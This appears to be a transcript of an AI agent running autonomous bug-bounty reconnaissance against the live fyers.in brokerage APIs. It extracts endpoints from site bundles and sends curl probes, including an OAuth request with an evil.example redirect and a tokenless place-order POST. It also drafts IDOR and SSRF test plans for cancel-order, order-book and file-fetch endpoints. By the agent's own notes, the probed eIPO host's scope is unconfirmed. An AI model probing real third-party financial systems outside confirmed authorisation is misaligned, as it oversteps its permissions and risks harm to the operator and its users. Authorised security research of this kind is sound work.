+### getParticularOrderDetails :: { api: "/place-order", method: "post", baseURL: "normal", token: true }, // To get Particular Order Details getParticularOrderDetails: { api: "/order-book", method: "post", baseURL: "normal", token: true }, // To get Orders list getOrdersList: { api: "/order-boo
+  ---
+### getParticularOrderDetails :: return function (_x, _x2) { return _ref.apply(this, arguments); }; }()); }; // Get Particular Order Details var getParticularOrderDetails = /*#__PURE__*/function () { var _ref2 = Object(asyncToGenerator["a" /* default */])( /*#__PURE__*/regenerator_default.a.mark(function _callee2(body) {
+  ---
+### CreateIPOOrder :: rn /* binding */ getParticularOrderDetails; }); __webpack_require__.d(__webpack_exports__, "b", function() { return /* binding */ CreateIPOOrder; }); __webpack_require__.d(__webpack_exports__, "m", function() { return /* binding */ Modify_IPOOrder; }); __webpack_require__.d(__webpack_exports__, "k", function(
+  ---
+### CreateIPOOrder :: eturn function getParticularOrderDetails(_x3) { return _ref2.apply(this, arguments); }; }(); // Place Order API Action var CreateIPOOrder = /*#__PURE__*/function () { var _ref3 = Object(asyncToGenerator["a" /* default */])( /*#__PURE__*/regenerator_default.a.mark(function _callee3(body) { return
+  ---
+### CreateIPOOrder :: case 1: case "end": return _context3.stop(); } } }, _callee3); })); return function CreateIPOOrder(_x4) { return _ref3.apply(this, arguments); }; }(); // Modify Order API Action var Modify_IPOOrder = /*#__PURE__*/function () { var _ref4 = Object(asyncToGe
+  ---
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+for f in ['ipo_pages_details-e985e9738dcfb33aedc9.js.js','ipo_75fc9c18.ccc0cedbfc497af63ab1.js.js']:
+    s=open(f,encoding='utf-8',errors='ignore').read()
+    print(f"########## {f} len {len(s)}")
+    for kw in ['pageNumber','FormFromId','FormToId','orderId','order_id','offer_id','type: 0','type: 1','"type"','getOrdersList(body','body:','request_type','OrderType','orderType']:
+        hits=[m.start() for m in re.finditer(re.escape(kw),s)]
+        if hits:
+            print(f"  [{kw}] {len(hits)}")
+            for m in hits[:3]:
+                print('     ...', ' '.join(s[max(0,m-90):m+150].split())[:240])
+EOF
+########## ipo_pages_details-e985e9738dcfb33aedc9.js.js len 745081
+  [order_id] 1
+     ... -order", method: "delete", baseURL: "common", token: true, query: { order_id: null, offer_id: null }, get api() { return this.url + generateQuery(this.query); }, set addQuery(_ref3) {
+  [offer_id] 6
+     ... delete", baseURL: "common", token: true, query: { order_id: null, offer_id: null }, get api() { return this.url + generateQuery(this.query); }, set addQuery(_ref3) { var key = _ref3.key,
+     ... "get", baseURL: "ipo", // token: true, query: { offer_type: null, offer_id: null }, get api() { return this.url + generateQuery(this.query); }, set addQuery(_ref5) { var key = _ref5.key,
+     ... x_price = _ref.max_price, name = _ref.name, is_active = _ref.is_active, offer_id = _ref.offer_id, max_bid_qty = _ref.max_bid_qty, min_bid_qty = _ref.min_bid_qty, bid_end_date = _ref.bid_end_date, mi
+  [body:] 8
+     ... _3___default.a.bool, color: prop_types__WEBPACK_IMPORTED_MODULE_3___default.a.string, body: prop_types__WEBPACK_IMPORTED_MODULE_3___default.a.bool, outline: prop_types__WEBPACK_IMPORTED_MODULE_3___default.a.bool, className: prop_typ
+     ... ead(IPOactions_objectSpread({}, IPO_API.getParticularOrderDetails), {}, { body: body })).then(function (res) { resolve(res); })["catch"](function (error) { //debugg
+     ... s_objectSpread(IPOactions_objectSpread({}, IPO_API.createIPOOrder), {}, { body: body })).then(function (res) { resolve(res); })["catch"](function (error) { var err
+  [OrderType] 1
+     ... BidDetails: "", ApplicationAmount: "", PayableAmount: "1000", OrderStatus: "455", OrderType: 1, Remarks: "", FormRanges: "", InitialChequeNo: "0", BrokerRefNo: "", SubBrokerCode: "", ARN: "", PaymentMode: "", RMCode:
+########## ipo_75fc9c18.ccc0cedbfc497af63ab1.js.js len 174070
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+s=open('ipo_pages_details-e985e9738dcfb33aedc9.js.js',encoding='utf-8',errors='ignore').read()
+# find body-literal construction near getOrdersList/getParticularOrderDetails/getOffersOrdersList usage in components
+for m in list(re.finditer(r'getOrdersList\(', s))[:10]:
+    j=m.start()
+    c=s[j:j+2600]
+    # print any object-literal containing keys like pageNumber
+    print("=== getOrdersList call region ===")
+    print(' '.join(c.split())[:700])
+    print('  ----')
+    break
+for m in list(re.finditer(r'getParticularOrderDetails\(', s))[:10]:
+    j=m.start()
+    print("=== getParticularOrderDetails call region ===")
+    print(' '.join(s[j:j+1800].split())[:500])
+    print('  ----')
+    break
+for m in list(re.finditer(r'getOffersOrdersList\(', s))[:10]:
+    j=m.start()
+    print("=== getOffersOrdersList call region ===")
+    print(' '.join(s[j:j+1800].split())[:500])
+    print('  ----')
+    break
+EOF
+=== getParticularOrderDetails call region ===
+getParticularOrderDetails(_x3) { return _ref2.apply(this, arguments); }; }(); // Place Order API Action var CreateIPOOrder = /*#__PURE__*/function () { var _ref3 = Object(asyncToGenerator["a" /* default */])( /*#__PURE__*/regenerator_default.a.mark(function _callee3(body) { return regenerator_default.a.wrap(function _callee3$(_context3) { while (1) { switch (_context3.prev = _context3.next) { case 0: return _context3.abrupt("return", new Promise(function (resolve, reject) { api_api(IPOactions_ob
+  ----
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+s=open('ipo_pages_orders-4e41d0a397e63dd565a1.js.js',encoding='utf-8',errors='ignore').read()
+# The orders page: find where it calls order actions. Search for all imports and call sites.
+for kw in ['getOrdersList','getParticularOrderDetails','getOffersOrdersList','getInvestorDetails','getMyAccountInvestorDetails','getOfferDetails','order-book','IssueId','offer_id','pageNumber','OrderId','IPOIssueId','IssueId:']:
+    for m in list(re.finditer(re.escape(kw),s))[:6]:
+        j=m.start()
+        print(f"### {kw} ::", ' '.join(s[max(0,j-110):j+150].split())[:260])
+        print('  ---')
+EOF
+### IssueId :: , name: "Ongoing" }, { id: 2, name: "Upcoming" }, { id: 3, name: "Past" }]; var InitialObj = { IPOIssueId: "", IsNRI: "0", DPIdBeneficiary: "", IsCutOff: "0", IsPartial: "0", PartialAmount: "1000", BidDetails: "", ApplicationAmount: "
+  ---
+### IPOIssueId :: : 1, name: "Ongoing" }, { id: 2, name: "Upcoming" }, { id: 3, name: "Past" }]; var InitialObj = { IPOIssueId: "", IsNRI: "0", DPIdBeneficiary: "", IsCutOff: "0", IsPartial: "0", PartialAmount: "1000", BidDetails: "", ApplicationAmount
+  ---
+### IssueId: :: , name: "Ongoing" }, { id: 2, name: "Upcoming" }, { id: 3, name: "Past" }]; var InitialObj = { IPOIssueId: "", IsNRI: "0", DPIdBeneficiary: "", IsCutOff: "0", IsPartial: "0", PartialAmount: "1000", BidDetails: "", ApplicationAmount: "
+  ---
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+s=open('ipo_pages_details-e985e9738dcfb33aedc9.js.js',encoding='utf-8',errors='ignore').read()
+for kw in ['FormFromId','FormToId','pageNumber','OrderStatus','AMOStatus','BidDetails','discount','order_list','OrderList','pagination','offset','limit','fetchOrders','getOrders','orderHistory','fetchIPOOrders']:
+    hits=[m.start() for m in re.finditer(re.escape(kw),s)]
+    if hits:
+        print(f"[{kw}] {len(hits)}", ' | '.join([' '.join(s[max(0,m-70):m+120].split())[:170] for m in hits[:3]]))
+        print()
+EOF
+[OrderStatus] 1 BidDetails: "", ApplicationAmount: "", PayableAmount: "1000", OrderStatus: "455", OrderType: 1, Remarks: "", FormRanges: "", InitialChequeNo: "0", BrokerRefNo: "", SubBro
+
+[AMOStatus] 1 IFSC: "", Filler: "", ClientCategory: "", OrderSource: "WEB", AMOStatus: "AMO", AcceptedStatus: "ACCEPTED", pdiscountStatus: false, discountPercentage: false, discount: 0
+
+[BidDetails] 1 ry: "", IsCutOff: "0", IsPartial: "0", PartialAmount: "1000", BidDetails: "", ApplicationAmount: "", PayableAmount: "1000", OrderStatus: "455", OrderType: 1, Remarks: "",
+
+[discount] 7 erSource: "WEB", AMOStatus: "AMO", AcceptedStatus: "ACCEPTED", pdiscountStatus: false, discountPercentage: false, discount: 0 }; /***/ }), /***/ "4dOw": /***/ (function(m | tus: "AMO", AcceptedStatus: "ACCEPTED", pdiscountStatus: false, discountPercentage: false, discount: 0 }; /***/ }), /***/ "4dOw": /***/ (function(module, exports, __webpa | "ACCEPTED", pdiscountStatus: false, discountPercentage: false, discount: 0 }; /***/ }), /***/ "4dOw": /***/ (function(module, exports, __webpack_require__) { //! moment.j
+
+[offset] 15 ocument.body.appendChild(scrollDiv); var scrollbarWidth = scrollDiv.offsetWidth - scrollDiv.clientWidth; document.body.removeChild(scrollDiv); return scrollbarWidth; } fu | [ { since: '2019-05-01', offset: 1, name: '令和', narrow: '㋿', abbr: 'R', }, | e: '1989-01-08', until: '2019-04-30', offset: 1, name: '平成', narrow: '㍻', abbr: 'H', },
+
+[limit] 2 e Version 2.0 License for specific language governing permissions and limitations under the License. ********************************************************************* | submitted bid for amount not more than 5 Lakh or any other investment limit as applicable and prescribed by SEBI from time to time in any of the bidding options in the Tr
+
+[getOrders] 2 baseURL: "normal", token: true }, // To get Orders list getOrdersList: { api: "/order-book", method: "post", baseURL: "normal", token: true }, // // Offer A | api_api(IPOactions_objectSpread(IPOactions_objectSpread({}, IPO_API.getOrdersList), {}, { body: body })).then(function (res) { resolve(res);
+[0m
+[0m$ [0mecho "--- jhelum offer_list offer_type=-1 (public feed variant) ---"; curl -sk --max-time 15 -w ' | code=%{http_code}\n' "https://api-i1.fyers.in/investment/jhelum/v1/api/offer_list?offer_type=-1&is_active=1" 2>/dev/null | head -c 300; echo; sleep 6; echo "--- jhelum offer_list all-types summary (public) ---"; for t in 1 2 3 4; do r=$(curl -sk --max-time 15 "https://api-i1.fyers.in/investment/jhelum/v1/api/offer_list?offer_type=$t&is_active=1" 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print('type=%s n=%d'%($t, len(d.get('data') or [])))" 2>/dev/null); echo "  offer_type=$t -> $r"; sleep 5; done
+--- jhelum offer_list offer_type=-1 (public feed variant) ---
+{"Status":"ok","error_code":0,"data":[{"symbol":"LAPL","name":"Lapl Automotive","issue_type":"2","exchange":"12","isin":"INE0X9I01023","min_price":88,"max_price":94,"at_cutoff":null,"min_bid_qty":2400,"max_bid_qty":1644000,"bid_start_date":"2026-08-06","bid_end_date":"2026-08-10","market_open_time":
+--- jhelum offer_list all-types summary (public) ---
+  offer_type=1 -> type=1 n=2
+  offer_type=2 -> type=2 n=2
+  offer_type=3 -> type=3 n=0
+  offer_type=4 -> type=4 n=0
+[0m
+[0m$ [0mecho "--- generate-authcode ipo client (read-only login initiation, no OTP) ---"; curl -sk --max-time 15 -o /dev/null -w 'code=%{http_code}\n' -I "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://ipo.fyers.in&response_type=code&state=abcdefg" 2>/dev/null; sleep 4; echo "--- generate-authcode ipo client, bad redirect_uri (allow-list check) ---"; curl -sk --max-time 15 -I "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://evil.example&response_type=code&state=x" 2>/dev/null | grep -iE "^HTTP|^location|set-cookie" | head -5; echo; sleep 5; echo "--- invest/v1/ipo/issue-list with uuid-style IssueId (public GET) ---"; curl -sk --max-time 15 -w ' | code=%{http_code}\n' "https://api-i1.fyers.in/invest/v1/ipo/issue-list?IssueId=00000000-0000-0000-0000-000000000000&IsActive=1" 2>/dev/null | head -c 300
+--- generate-authcode ipo client (read-only login initiation, no OTP) ---
+code=403
+--- generate-authcode ipo client, bad redirect_uri (allow-list check) ---
+HTTP/2 403 
+set-cookie: __cf_bm=EscjPf2DSfGyXO665eXfcrEUCLn4kpE9sNTQqClbH7A-1786207192.9061644-1.0.1.1-nburLKsbFJqAb1W4bmLz_X3rqCRGuG4z9iTx8gFauAOEicDhRH2HfVCWZkJ2qjeDKb6uxQgi0S2HzYbUkpBZeSZw2PJoUDrTRjnb9HRNjKwvCYuXc0GIZ.I95rijgf80; HttpOnly; SameSite=None; Secure; Path=/; Domain=fyers.in; Expires=Sat, 08 Aug 2026 17:09:52 GMT
+
+--- invest/v1/ipo/issue-list with uuid-style IssueId (public GET) ---
+error code: 502
+ | code=502
+[0m
+[0m$ [0msleep 8; echo "--- place-order full-field null payload, NO token (auth-order check, no side effect) ---"; curl -sk --max-time 20 -w ' | code=%{http_code}\n' -X POST -H 'Content-Type: application/json' -d '{"OrderId":"","IPOIssueId":"","IsNRI":"0","DPIdBeneficiary":"","IsCutOff":"0","IsPartial":"0","PartialAmount":"","BidDetails":"","ApplicationAmount":"","PayableAmount":"","OrderStatus":"","OrderType":"","Remarks":"","FormRanges":"","InitialChequeNo":"","BrokerRefNo":"","SubBrokerCode":"","ARN":"","PaymentMode":"","RMCode":"","IsEmp":"","EmpCode":"","StartChequeNo":"","EndChequeNo":"","RequestedBy":"","UPIID":"","BankAccountNo":"","IFSC":"","Filler":"","OrderSource":"","ClientCategory":""}' "https://api-i1.fyers.in/invest/v1/ipo/place-order" 2>/dev/null | head -c 400
+--- place-order full-field null payload, NO token (auth-order check, no side effect) ---
+{"s":"error","code":401,"message":"Authorization header is missing"} | code=401
+[0m
+[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && cat >> findings_deepseek.md << 'EOF'
+
+# SURFACE round 2026-08-08 09:5x UTC — api-i1 eIPO family: exact request shapes (SPA registry + InitialObj + OAuth client) + auth-ordering split /invest vs tapi/eipo
+- **Exact request shapes recovered from ipo.fyers.in SPA bundles** (read-only; `pages/details-*.js` 745 KB, `pages/orders-*.js` 21 KB, `pages/ipo/updateipo`):
+  - Registry `IPO_API` (all endpoints verified against gate probes): `GET /invest/v1/ipo/issue-list?IssueId=&IsActive=` (public), `GET /invest/v1/ipo/issue-details?IssueId=` (public), `GET /invest/v1/ipo/investors-details` (token), `POST /invest/v1/ipo/place-order` (token; also used for Modify), `POST /invest/v1/ipo/order-book` (token; getParticularOrderDetails + getOrdersList), `GET /investment/jhelum/v1/api/offer_list?offer_type=&is_active=` (public), `GET /investment/jhelum/v1/api/offer_details?offer_type=&offer_id=` (public), `POST /investment/tapi/v1/eipo/place-order`, `PUT /investment/tapi/v1/eipo/modify-order`, `DELETE /investment/tapi/v1/eipo/cancel-order?order_id=&offer_id=`, `POST /investment/tapi/v1/eipo/order-book` (all token).
+  - **`InitialObj` (place-order body default, 36 fields):** `IPOIssueId,IsNRI:"0",DPIdBeneficiary,IsCutOff:"0",IsPartial:"0",PartialAmount:"1000",BidDetails,ApplicationAmount,PayableAmount:"1000",OrderStatus:"455",OrderType:1,Remarks,FormRanges,InitialChequeNo:"0",BrokerRefNo,SubBrokerCode,ARN,PaymentMode,RMCode,IsEmp:"False",EmpCode,StartChequeNo,EndChequeNo,RequestedBy,UPIID,BankAccountNo,IFSC,Filler,ClientCategory,OrderSource:"WEB",AMOStatus:"AMO",AcceptedStatus:"ACCEPTED",pdiscountStatus,discountPercentage,discount`.
+  - **NEW OAuth client_id `EFR7964223-101`** (redirect_uri `https://ipo.fyers.in`, prod appIdHash `2a88a14a353274a2f35430038b6d81725e2d17d8064785d62965e4da78033e9f`); SPA uses **hardcoded `state=abcdefg`** in `generate-authcode` (same class as journal `sample_state` → informational hardening, H1-class NOT bounty-eligible). Dev/staging twins recorded but out-of-scope (`invest-dev.fydev.tech`; staging `api-t1.fyers.co.in` paths).
+  - Auth: `POST api-t1.fyers.in/api/v3/validate-authcode {grant_type:"authorization_code",appIdHash,code}` → `access_token` raw in localStorage → sent as plain `Authorization:` header (no Bearer), axios interceptor deletes header when absent.
+- **Auth-ordering split CONFIRMED (key SURFACE result):** `/invest/v1/ipo/*` = **validation-before-auth** — `{}` → full Pydantic field-required oracle (31 fields); a full-but-empty 36-field payload (NO token) → `401 {"s":"error","code":401,"message":"Authorization header is missing"}` ⇒ **body validation runs BEFORE the auth gate; auth still rejects tokenless input** (schema enumerable pre-auth, NO order-placement primitive pre-auth). `/investment/tapi/v1/eipo/*` = **auth-first** — `{}` → `401 {"error_code":-100,"message":"Authorisation token required."}` before any schema check.
+- **jhelum offer_list/offer_details = fully PUBLIC live IPO feed (by design):** all `offer_type` variants return live data (`-1`→LAPL SME `issue_type:2`; `1`,`2`→2 offers each; `3`,`4`→0); payload = symbol, isin, min/max price, bid dates, `offer_id` UUID, series/category/sub-category settings. Invalid `offer_id` → 200 `{"error_code":-99,"message":"No record found"}` (no leak). Informational only.
+- **Negative/hardening notes:** `invest/v1/ipo/issue-list` with a uuid-style `IssueId` → **CF 502** (upstream unhandled-input error candidate; informational, FYERS-side confirm; not driven further); repeated `api-t1` probes began getting CF 403 (`__cf_bm`) bot-blocks → back off per guardrails. `generate-authcode` 403 = CF bot-block, not app behavior (H1-adjacent anyway, excluded from bounty).
+- **H22 status update:** conditional IDOR on tapi `order_id`/`offer_id` object keying stands (auth-first, own-session baseline → foreign order_id substitution; FYERS-side). The /invest validation-before-auth is now characterized as a **schema-oracle-only** finding (B9, informational) — no order-placement primitive pre-auth exists. Combined H22 program band unchanged (informational–Medium conditional).
+EOF
+echo appended; tail -2 findings_deepseek.md | head -c 400
+appended
+- **Negative/hardening notes:** `invest/v1/ipo/issue-list` with a uuid-style `IssueId` → **CF 502** (upstream unhandled-input error candidate; informational, FYERS-side confirm; not driven further); repeated `api-t1` probes began getting CF 403 (`__cf_bm`) bot-blocks → back off per guardrails. `generate-authcode` 403 = CF bot-block, not app behavior (H1-adjacent anyway, excluded from bounty).
+[0m
+[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && tail -45 reports/submission-package_fyers-bb.md
+### E3 (A3/H15 marina/ddpi instruction-object IDOR) — baseline https://api-a1.fyers.in
+- Shape 1 GET  /marina/v1/ddpi/user/listing (own instructions)
+- Shape 2 GET  /marina/v1/ddpi/status?instruction_id=<OWN>
+- Shape 3 GET  /marina/v1/ddpi/status?instruction_id=<SECOND_ACCOUNT_INSTRUCTION_ID>
+- Shape 4 GET  /marina/v1/ddpi/timeline?instruction_id=<SECOND_ACCOUNT_INSTRUCTION_ID>
+- Success: foreign instruction status/timeline/file returned; FIXED: 403/404/-16-scoped.
+
+### E4 (A4/H18 journal-server note/upload) — base https://api-a1-prod.fyers.in
+- Header on all: Authorization: Bearer <OWN_SESSION_TOKEN>
+- Shape 1 GET  /journal-server/v1/notes-list?date=<TODAY_ISO>            (own)
+- Shape 2 GET  /journal-server/v1/note/detail?note_ids=<OWN_NOTE_ID>&gs=  (own)
+- Shape 3 GET  /journal-server/v1/note/detail?note_ids=<SECOND_ACCOUNT_NOTE_ID>&gs=
+- Shape 4 GET  /journal-server/v1/note/detail?note_ids=<SECOND_ACCOUNT_DOCID>&gs=(document id)
+- Success: B's note/document payload in A's response; FIXED: 403 {"code":401...} / 404.
+
+### E5 (A5/H19 api-testing-prod unauth upload tier) — base https://api-testing-prod.fyers.in
+- NOTE: scope-confirm first (C2). No file payload or external URL fetch should be performed by
+  the researcher; these are the service-side validation probes.
+- Shape 1 POST /signup/upload/api/v1/user/general/upload-image
+   body {"file":"<MINIMAL_1x1_PNG_or_set of null>","fileName":"<NAME>","key":"<KEY>"}
+- Shape 2 POST /signup/upload/api/v1/user/fetch-pan
+   body {"base64_image":"<NULL/EMPTY>","fileName":"<NAME>","key":"<KEY>"}
+- Shape 3 POST /signup/upload/signature-to-bmp
+   body {"base64_image":"<NULL/EMPTY>","fileName":"<NAME>","key":"user/signature/bmp"}
+- Shape 4 POST /signup/upload/api/v1/pdf/is-password-protected
+   body {"file_url":"http://127.0.0.1:1/x.pdf"}          (connection-refused oracle)
+   body {"file_url":"https://api-t1.fyers.in/"}           (in-scope internal fetch oracle)
+   body {"file_url":"not-a-url"}                            (validation oracle)
+- Shape 5 POST /signup/upload/api/v1/user/general/zip-all-images (expected 200 no-auth no-op)
+- Success indicators: distinct status/body across file_url cases (proves server fetch);
+  foreign-object read/zip includes a caller-uploaded object → unauth write. FIXED: token
+  rejection / allow-listed hosts / session-bound keys.
+
+### E6 (A6/H21 nucleus/v1 object-keyed IDOR) — base https://api-t1.fyers.in
+- Header all: Authorization: Bearer <USER_SESSION_TOKEN>, version: 1.0.0
+- Shape 1 GET  /nucleus/v1/history/{OWN_CID}              (baseline)
+- Shape 2 GET  /nucleus/v1/history/{SECOND_ACCOUNT_CID}
+- Shape 3 DELETE /nucleus/v1/drawings/{A}/{B}  (own drawing key → foreign key substitution)
+- Shape 4 POST /nucleus/v1/chat  body {"cid":"<FOREIGN_CID>","prompt":"<EMPTY>||<DOC_QUERY>"}
+- Success: foreign conversation/drawing object in response; FIXED: 403/404/empty.
+
+## CVSS (program rubric governs; CVSS reference only)
+- A1/H17 8.1–9.1 (Critical/High if unmasked PAN/eSign/PDF) · A5/H19 5.3–7.5 (Medium–High)
+- A2/H13, A3/H15, A4/H18 5.3–7.5; A6/H21 5.3–6.5 — all conditional on FYERS-side validation
+[0m
+[0m✱ [0mGrep "^## F|^### A7|^### B9|E\.7"[90m in reports/submission-package_fyers-bb.md · 0 matches[0m
+[0m
+[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && wc -l reports/submission-package_fyers-bb.md && tail -6 reports/submission-package_fyers-bb.md
+199 reports/submission-package_fyers-bb.md
+- Shape 4 POST /nucleus/v1/chat  body {"cid":"<FOREIGN_CID>","prompt":"<EMPTY>||<DOC_QUERY>"}
+- Success: foreign conversation/drawing object in response; FIXED: 403/404/empty.
+
+## CVSS (program rubric governs; CVSS reference only)
+- A1/H17 8.1–9.1 (Critical/High if unmasked PAN/eSign/PDF) · A5/H19 5.3–7.5 (Medium–High)
+- A2/H13, A3/H15, A4/H18 5.3–7.5; A6/H21 5.3–6.5 — all conditional on FYERS-side validation
+[0m
+[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && cat >> reports/submission-package_fyers-bb.md << 'EOF'
+
+## F. 2026-08-08 eIPO surface (ipo.fyers.in / api-i1.fyers.in) — NEW host, scope-confirm first
+- NEW host `api-i1.fyers.in` (three microservices: /invest/v1/ipo, /investment/jhelum/v1/api, /investment/tapi/v1/eipo) + `ipo.fyers.in` Next.js SPA (routes /home /ipo /orders /details /updateipo).
+- C9 scope-confirm: api-i1.fyers.in / ipo.fyers.in eIPO order surface in scope? (host absent from indus/v1/config and config.gz public lists).
+
+### A7 — H22 eIPO order/offer-id object-keyed IDOR (conditional, FYERS-side/own-session only)
+- Host: api-i1.fyers.in (own session token; plain `Authorization:` header, NO Bearer — as SPA does).
+- Shape 1 POST /investment/tapi/v1/eipo/order-book  body {} (auth-first -100 gate) → with OWN token + own order_id → 200-with-data; substitution with second account's order_id (baseline → delta).
+- Shape 2 DELETE /investment/tapi/v1/eipo/cancel-order?order_id=<FOREIGN_ORDER>&offer_id=<FOREIGN>
+- Shape 3 GET /investment/jhelum/v1/api/offer_details?offer_type=1&offer_id=<FOREIGN> — verify intentionally-public feed (informational; offer data public by design).
+- Success indicator: foreign order/instruction object returned/modified under own session. FIXED: 403/404/-100.
+- NOTE: /invest/v1/ipo/place-order is validation-before-auth (schema oracle pre-auth) but the auth gate DOES reject tokenless full payloads (401 "Authorization header is missing") — no order-placement primitive pre-auth; do NOT send a valid order payload without a token (order confusion risk).
+
+### B9 — eIPO informational / hardening
+- validation-before-auth Pydantic field-required full-field oracle on /invest/v1/ipo/{place-order (31 fields), order-book (pageNumber,OrderId,IssueId,FormFromId,FormToId)} — schema disclosure only, no data leak, no pre-auth order primitive (auth gate runs after schema, rejects tokenless).
+- api-i1 auth fingerprints: -100 "Authorisation token required." (tapi trade ops, auth-first) · -441 "auth code is required" (validate-authcode) · Pydantic-field JSON oracles (/invest) · invest wrapper 401-in-HTTP-200 (investors-details with dummy token → HTTP 200 body {"code":401,...}).
+- Public jhelum offer_list/offer_details = live IPO feed (offer_type -1/1/2/3/4; symbol, isin, price bands, offer_id UUID) — public by design, informational.
+- ipo.fyers.in OAuth client_id `EFR7964223-101`, redirect_uri https://ipo.fyers.in, prod appIdHash 2a88a14a353274a2f35430038b6d81725e2d17d8064785d62965e4da78033e9f, hardcoded `state=abcdefg` — informational hardening (H1-class open-redirect/state, NOT bounty-eligible per program Expected Behaviour).
+
+### E7 — exact eIPO request shapes (SPA registry + InitialObj; FYERS-side / own-account)
+- POST api-t1.fyers.in/api/v3/validate-authcode  body {"grant_type":"authorization_code","appIdHash":"2a88a14a353274a2f35430038b6d81725e2d17d8064785d62965e4da78033e9f","code":"<AUTH_CODE>"} → access_token (own-account only).
+- GET  api-i1.fyers.in/invest/v1/ipo/issue-list?IssueId=&IsActive=          (public; uuid-style IssueId → CF 502 upstream-error candidate, FYERS-side confirm)
+- GET  api-i1.fyers.in/invest/v1/ipo/issue-details?IssueId=                 (public)
+- GET  api-i1.fyers.in/invest/v1/ipo/investors-details                      (token; 401 missing-header / 200-wrap could-not-auth)
+- POST api-i1.fyers.in/invest/v1/ipo/place-order  body = InitialObj (36 fields, defaults above) — token; own-account only
+- POST api-i1.fyers.in/invest/v1/ipo/order-book  body {"pageNumber":<n>,"OrderId":<OWN>,"IssueId":<OWN>,"FormFromId":<...>,"FormToId":<...>}  (schema oracle pre-auth; substitution delta on OrderId/IssueId)
+- GET  api-i1.fyers.in/investment/jhelum/v1/api/offer_list?offer_type=-1|1|2|3|4&is_active=1   (public feed)
+- GET  api-i1.fyers.in/investment/jhelum/v1/api/offer_details?offer_type=1&offer_id=<OFFER_UUID>  (public)
+- POST api-i1.fyers.in/investment/tapi/v1/eipo/order-book  (auth-first -100; own-session order_id baseline → foreign delta)
+- DELETE api-i1.fyers.in/investment/tapi/v1/eipo/cancel-order?order_id=<OWN>&offer_id=<OWN>  (auth-first; substitution delta)
+
+### CVSS addendum (program rubric governs)
+- A7/H22 5.3–6.5 conditional (Medium if cross-account eIPO order read demonstrated) · B9 informational.
+EOF
+wc -l reports/submission-package_fyers-bb.md
+232 reports/submission-package_fyers-bb.md
+[0m
+[0m← [0mWrite state_deepseek.json
+Wrote file successfully.
+[0m
+[0m← [0mWrite reports/analyst-latest.txt
+Wrote file successfully.
+[0m
+[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && git add -A && git -c user.email="analyst@fyers-recon.local" -c user.name="fyers-recon-analyst" commit -q -m "analyst fyers.in 2026-08-08-09-5x (SURFACE): api-i1 eIPO exact shapes + auth-ordering split (validation-before-auth /invest vs auth-first tapi) + OAuth client EFR7964223-101 + H22/A7 finalized" && git log --oneline -1
+9fc081a analyst fyers.in 2026-08-08-09-5x (SURFACE): api-i1 eIPO exact shapes + auth-ordering split (validation-before-auth /invest vs auth-first tapi) + OAuth client EFR7964223-101 + H22/A7 finalized
+[0m
+# Target: fyers.in
+# Current Phase: SURFACE
+
+## Key Findings
+- **api-i1.fyers.in eIPO family fully characterized** (read-only, from `ipo.fyers.in` SPA bundles `pages/details-*.js` 745 KB, `pages/orders-*.js`, plus build manifest). Recovered: `IPO_API` registry, 36-field `InitialObj` (place-order default body), OAuth constants, and per-route gate behavior.
+- **Auth-ordering split CONFIRMED (new):** `/invest/v1/ipo/*` = **validation-before-auth** — `{}` → full 31-field Pydantic `field required` oracle; a complete 36-field empty payload with **no token** → `401 "Authorization header is missing"` ⇒ schema enumerable pre-auth but the auth gate still rejects tokenless input (no pre-auth order-placement primitive). `/investment/tapi/v1/eipo/*` = **auth-first** — `{}` → `401 {"error_code":-100,"message":"Authorisation token required."}` before any schema check.
+- **New OAuth client_id `EFR7964223-101`** (redirect `https://ipo.fyers.in`, prod `appIdHash 2a88a14a…`, **hardcoded `state=abcdefg`**) — same class as journal `sample_state`; informational/hardening, H1-class **not bounty-eligible**.
+- **jhelum offer_list/offer_details = fully public live IPO feed** (all `offer_type` -1/1/2/3/4 return live data; `-99 No record found` on bad id) — public by design, informational.
+- **Negatives:** uuid-style `IssueId` on `issue-list` → CF 502 (upstream unhandled-input candidate; FYERS-side confirm, not driven); repeated api-t1 probes began getting CF 403 `__cf_bm` bot-blocks → backed off per guardrails.
+
+## API Endpoints (this run)
+- `api-i1.fyers.in/invest/v1/ipo/{issue-list,issue-details}` GET public · `{investors-details,place-order,order-book}` token, validation-before-auth
+- `api-i1.fyers.in/investment/jhelum/v1/api/{offer_list,offer_details}` GET public
+- `api-i1.fyers.in/investment/tapi/v1/eipo/{place-order,modify-order,cancel-order,order-book}` auth-first `-100`
+- `api-t1.fyers.in/api/v3/validate-authcode` → `-441` when no `code`
+
+## Hypotheses
+### H22 — eIPO order/offer object-keyed IDOR (conditional; A7/E7 in package)
+Reasoning: tapi/eipo order-book + cancel-order keyed by `order_id`/`offer_id` behind auth-first gate; per-owner scoping not provable pre-auth. The /invest oracle is schema-only (auth rejects tokenless).
+Impact: cross-account eIPO order read/cancel → program Medium (conditional). CVSS 5.3–6.5.
+Test: own-session baseline → foreign `order_id` substitution; FYERS-side/own-account only, **not executed**.
+
+## CVSS Candidates
+- [H17 req_id] 8.1–9.1 · [H19 unauth upload/SSRF] 5.3–7.5 · [H15/H18] 5.3–7.5 · [H13/H21/H22] 5.3–6.5 — all conditional, FYERS-side validation
+- [B1–B9 informational bundle incl. eIPO schema oracle + OAuth state/client] — informational/low
+
+---
+## STATE UPDATE FOR NEXT RUN
+STATUS_TARGET: fyers.in
+STATUS_PHASE: SURFACE
+STATUS_STATE: IN_PROGRESS
+
+NEXT_STEP_1: HYPOTHESIS on api-i1 eIPO family — analyze `offer_id`/`order_id`/`IssueId`/`IPOIssueId` + InitialObj keying for cross-account substitution on /invest + tapi/eipo order-book/cancel-order; finalize H22 severity (informational–Medium conditional).
